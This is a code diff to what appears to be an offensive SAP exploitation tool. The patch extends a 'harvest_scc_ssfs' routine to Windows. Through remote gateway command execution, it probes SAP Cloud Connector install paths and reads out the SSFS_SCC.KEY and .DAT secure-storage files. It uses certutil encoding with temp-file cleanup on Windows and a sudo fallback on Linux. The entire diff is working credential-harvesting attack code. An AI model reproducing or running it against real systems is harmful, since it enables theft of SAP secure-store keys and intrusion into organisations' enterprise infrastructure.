@@ -2477,48 +2477,96 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 from sapmap_exploit import execute_gw_command
                 import base64 as _b64
 
+                is_win = "windows" in (node.os_type or "").lower() or \
+                         "nt" in (node.os_type or "").lower()
+
+                def _gw(prog, arg):
+                    r = execute_gw_command(node, prog, arg, long_params="")
+                    return "\n".join(r.get("output") or []).strip()
+
+                # --- Discover SCC root ----------------------------------------
+                if is_win:
+                    win_roots = [
+                        r"C:\SAP\scc20", r"C:\SAP\scc", r"C:\SAP\scc21",
+                        r"C:\SAP\scc22", r"C:\SAP\scc19", r"C:\sap\scc",
+                        r"C:\Program Files\SAP\Cloud Connector",
+                        r"C:\Program Files\SAP\SAP Cloud Connector",
+                    ]
+                    scc_root = None
+                    for root in win_roots:
+                        probe = rf"{root}\scc_config\SSFS_SCC.KEY"
+                        out = _gw("cmd.exe",
+                                  f"/c if exist \"{probe}\" echo FOUND")
+                        print(f"[*] {sid}: harvest_scc_ssfs probe {probe} → "
+                              f"{out[:30]!r}")
+                        if "FOUND" in out:
+                            scc_root = root
+                            break
+                    if not scc_root:
+                        # glob fallback
+                        g = _gw("cmd.exe",
+                                r"/c dir /s /b C:\SAP\scc*\scc_config\SSFS_SCC.KEY 2>nul")
+                        for line in g.splitlines():
+                            line = line.strip()
+                            if line.upper().endswith("SSFS_SCC.KEY"):
+                                # line is full path to KEY; root is 2 levels up
+                                import os as _os
+                                scc_root = _os.path.dirname(
+                                    _os.path.dirname(line))
+                                print(f"[*] {sid}: harvest_scc_ssfs glob → "
+                                      f"{scc_root}")
+                                break
+                else:
+                    linux_roots = ["/opt/sap/scc", "/usr/local/scc",
+                                   "/opt/sapscc", "/opt/cloud-connector",
+                                   "/opt/SAP/cloud-connector"]
+                    scc_root = None
+                    for root in linux_roots:
+                        probe = f"{root}/scc_config/SSFS_SCC.KEY"
+                        out = _gw("ls", probe)
+                        if probe in out and "No such file" not in out:
+                            scc_root = root
+                            break
+
+                if not scc_root:
+                    print(f"[-] {sid}: harvest_scc_ssfs — SSFS files not found "
+                          f"(is_win={is_win})")
+                    return
+
+                print(f"[*] {sid}: harvest_scc_ssfs — SCC root={scc_root}")
+
+                # --- Read KEY + DAT -------------------------------------------
+                sep = "\\" if is_win else "/"
+
                 def _read_b64(path):
-                    r = execute_gw_command(node, "base64", path,
-                                          long_params="")
-                    out = "\n".join(r.get("output") or []).strip()
-                    if not out or "No such file" in out or "Permission denied" in out:
-                        # sudo fallback
-                        r2 = execute_gw_command(node, "sudo",
-                                                f"base64 {path}",
-                                                long_params="")
-                        out = "\n".join(r2.get("output") or []).strip()
-                    if not out or "No such file" in out or "Permission denied" in out:
-                        return None, out[:80]
+                    if is_win:
+                        # certutil -encode to temp, read with more
+                        tmp = r"C:\Windows\Temp\.scc_ssfs.b64"
+                        _gw("cmd.exe",
+                            f"/c certutil -encode \"{path}\" \"{tmp}\" 2>nul")
+                        out = _gw("cmd.exe", f"/c more \"{tmp}\"")
+                        _gw("cmd.exe", f"/c del /q \"{tmp}\" 2>nul")
+                        import re as _re2
+                        b64 = "".join(_re2.findall(
+                            r'[A-Za-z0-9+/=]+', out))
+                    else:
+                        out = _gw("base64", path)
+                        if not out or "No such file" in out or \
+                                "Permission denied" in out:
+                            out = _gw("sudo", f"base64 {path}")
+                        b64 = out.replace("\n","").replace("\r","")
+                    if not b64:
+                        return None, "empty output"
                     try:
-                        return _b64.b64decode(
-                            out.replace("\n","").replace("\r","")), ""
+                        return _b64.b64decode(b64), ""
                     except Exception as e:
                         return None, f"b64 error: {e}"
 
-                scc_roots = ["/opt/sap/scc", "/usr/local/scc",
-                             "/opt/sapscc", "/opt/cloud-connector",
-                             "/opt/SAP/cloud-connector"]
-                scc_root = None
-                for root in scc_roots:
-                    r_ls = execute_gw_command(
-                        node, "ls",
-                        f"{root}/scc_config/SSFS_SCC.KEY",
-                        long_params="")
-                    ls_out = "\n".join(r_ls.get("output") or []).strip()
-                    if (f"{root}/scc_config/SSFS_SCC.KEY" in ls_out
-                            and "No such file" not in ls_out):
-                        scc_root = root
-                        break
-                if not scc_root:
-                    print(f"[-] {sid}: harvest_scc_ssfs — SSFS files not found")
-                    return
-
-                print(f"[*] {sid}: harvest_scc_ssfs — reading KEY+DAT from "
-                      f"{scc_root}/scc_config/")
-                key_bytes, kerr = _read_b64(
-                    f"{scc_root}/scc_config/SSFS_SCC.KEY")
-                dat_bytes, derr = _read_b64(
-                    f"{scc_root}/scc_config/SSFS_SCC.DAT")
+                key_path = scc_root + sep + "scc_config" + sep + "SSFS_SCC.KEY"
+                dat_path = scc_root + sep + "scc_config" + sep + "SSFS_SCC.DAT"
+                print(f"[*] {sid}: harvest_scc_ssfs — reading {key_path}")
+                key_bytes, kerr = _read_b64(key_path)
+                dat_bytes, derr = _read_b64(dat_path)
 
                 if not key_bytes:
                     print(f"[-] {sid}: harvest_scc_ssfs — KEY read failed: {kerr}")
